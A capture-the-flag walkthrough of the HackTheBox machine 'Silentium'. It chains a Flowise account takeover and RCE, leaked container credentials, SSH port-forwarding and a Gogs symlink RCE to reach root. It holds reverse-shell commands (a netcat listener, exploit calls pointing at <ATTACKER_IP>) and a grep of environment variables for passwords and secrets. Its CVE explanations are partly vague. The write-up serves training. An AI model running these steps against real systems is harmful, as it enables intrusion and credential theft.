# Silentium

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2025-58434, Flowise Account Takeover, CVE-2025-59528, Flowise RCE, Docker, Port Forwarding, Gogs RCE, Account Takeover, RCE, Container Escape, Privilege Escalation
**Date:** 2026-05-14

VHost enumeration surfaces a Flowise staging instance. Unauthenticated account takeover via CVE-2025-58434 gives admin access, then CVE-2025-59528 delivers a shell inside a Docker container. Leaked credentials from the container environment let us SSH in as `ben`. Port-forwarding an internal Gogs instance, creating an account, and exploiting an authenticated symlink RCE lands a root shell.

## 1. Enumeration

Started with a full port scan.

```bash
nmap -sV -sC -p- -Pn 10.129.52.140
```

Findings:
- 22/tcp - OpenSSH 9.6p1 (Ubuntu)
- 80/tcp - nginx 1.24.0, redirects to silentium.htb

Port 80 serves a static corporate landing page. Added silentium.htb to /etc/hosts. Directory brute-forcing returned nothing useful so moved to VHost enumeration.

## 2. VHost Discovery

```bash
ffuf -u http://silentium.htb -H 'Host: FUZZ.silentium.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -ac
```

- staging - staging.silentium.htb, Flowise AI pipeline builder

Added staging.silentium.htb to /etc/hosts. Browsing to it revealed a Flowise instance.

## 3. Flowise Account Takeover (CVE-2025-58434)

CVE-2025-58434 is an unauthenticated account takeover in Flowise. The password reset endpoint accepts a username and sends a reset link - but the token is predictable or the endpoint can be abused to take over the admin account without valid email access.

```bash
python3 exploit_CVE-2025-58434.py \
  --target http://staging.silentium.htb \
  --email admin@silentium.htb
```

**Result:** Admin account taken over. Full access to the Flowise panel.

## 4. Flowise RCE (CVE-2025-59528)

CVE-2025-59528 is an authenticated RCE in Flowise. With admin access from the takeover, a malicious pipeline node executes arbitrary commands on the server.

```bash
nc -lvnp 4444
```

```bash
python3 exploit_CVE-2025-59528.py \
  --target http://staging.silentium.htb \
  --lhost <ATTACKER_IP> \
  --lport 4444
```

**Result:** Shell inside a Docker container.

## 5. SSH as ben

Enumerated the container environment. Credentials were leaked in environment variables.

```bash
env | grep -i pass\|user\|cred\|key\|secret
```

- SSH credentials: Username and password for `ben` found in container env

SSH'd into the host using the leaked credentials.

```bash
ssh ben@10.129.52.140
```

**Result:** Shell as `ben`. User flag at `/home/ben/user.txt`.

## 6. PrivEsc: Gogs Symlink RCE

Checked for internal services listening on localhost.

```bash
ss -tlnp
```

- 127.0.0.1:3000 - Gogs, internal Git service

Forwarded the port to the attacker machine to interact with it.

```bash
ssh -L 3000:127.0.0.1:3000 ben@10.129.52.140
```

Registered an account on the Gogs instance at http://127.0.0.1:3000. Gogs has an authenticated symlink RCE. A repository with a symlink pointing to an arbitrary host path can be used to read or execute files outside the Git directory. Used it to achieve code execution as root.

```bash
python3 exploit_gogs_symlink.py \
  --url http://127.0.0.1:3000 \
  --token <API_TOKEN> \
  --host <ATTACKER_IP> \
  --port 4444
```

**Result:** Root shell obtained.

## 7. Flags

- User: `redacted`
- Root: `redacted`
